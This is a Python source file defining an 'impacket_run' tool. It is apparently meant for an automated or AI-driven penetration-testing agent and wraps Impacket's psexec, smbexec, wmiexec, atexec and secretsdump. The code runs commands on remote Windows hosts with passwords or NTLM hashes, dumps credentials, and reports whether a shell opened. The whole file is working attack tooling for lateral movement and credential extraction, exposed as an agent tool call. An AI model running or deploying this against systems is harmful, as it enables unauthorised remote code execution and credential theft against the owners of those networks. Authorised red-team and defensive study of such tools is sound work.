"""V2 — impacket_run tool. Impacket suite for Windows lateral movement."""

from __future__ import annotations

import asyncio
import logging
import shutil

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)
IMPACKET_TIMEOUT = 90

_IMPACKET_TOOLS = {
    "psexec":      "impacket-psexec",
    "smbexec":     "impacket-smbexec",
    "wmiexec":     "impacket-wmiexec",
    "secretsdump": "impacket-secretsdump",
    "atexec":      "impacket-atexec",
}


class ImpacketTool(BaseTool):

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="impacket_run",
            category="exploit-exec",
            description=(
                "Impacket suite tools for Windows lateral movement and credential extraction.\n"
                "Tools: psexec, smbexec, wmiexec, secretsdump, atexec"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "tool":     {"type": "string",
                                 "enum": list(_IMPACKET_TOOLS.keys()),
                                 "description": "Which impacket tool to use"},
                    "target":   {"type": "string", "description": "Target IP or hostname"},
                    "username": {"type": "string"},
                    "password": {"type": "string", "default": ""},
                    "hash":     {"type": "string", "default": "",
                                 "description": "NTLM hash LM:NT format"},
                    "domain":   {"type": "string", "default": "WORKGROUP"},
                    "command":  {"type": "string", "default": "whoami",
                                 "description": "Command to execute (not used for secretsdump)"},
                    "timeout":  {"type": "integer", "default": 90},
                },
                "required": ["tool", "target", "username"],
            },
        )

    async def execute(self, params: dict) -> dict:
        tool = params.get("tool", "wmiexec")
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        domain = params.get("domain", "WORKGROUP")
        command = params.get("command", "whoami")
        timeout = int(params.get("timeout", IMPACKET_TIMEOUT))

        binary = shutil.which(_IMPACKET_TOOLS.get(tool, f"impacket-{tool}"))
        if not binary:
            binary = shutil.which(tool)  # some installs don't use prefix
        if not binary:
            return {"status": "error",
                    "error": f"impacket-{tool} not found — install with: apt install python3-impacket"}

        # Build credential string: domain/user:password or domain/user (hash via -hashes)
        cred = f"{domain}/{username}"
        cmd = [binary]
        if hash_val:
            cmd += ["-hashes", hash_val]
        elif password:
            cred += f":{password}"
        cmd += [cred + f"@{target}"]

        if tool != "secretsdump":
            cmd.append(command)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.DEVNULL,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            return {"status": "error", "error": f"impacket-{tool} timeout"}
        except Exception as e:
            return {"status": "error", "error": str(e)}

        output = stdout.decode(errors="replace")
        err = stderr.decode(errors="replace")
        success = proc.returncode == 0 or (len(output) > 20 and "error" not in output.lower()[:50])

        return {
            "status": "success" if success else "error",
            "tool": tool,
            "output": output[:8192],
            "error": err[:1024] if err else "",
            "session_opened": success and tool != "secretsdump",
            "shell": success,
        }

    async def health_check(self) -> ToolHealthStatus:
        found = any(shutil.which(b) for b in _IMPACKET_TOOLS.values())
        if found:
            return ToolHealthStatus(available=True, message="impacket_run")
        return ToolHealthStatus(available=False, message="impacket tools not found")
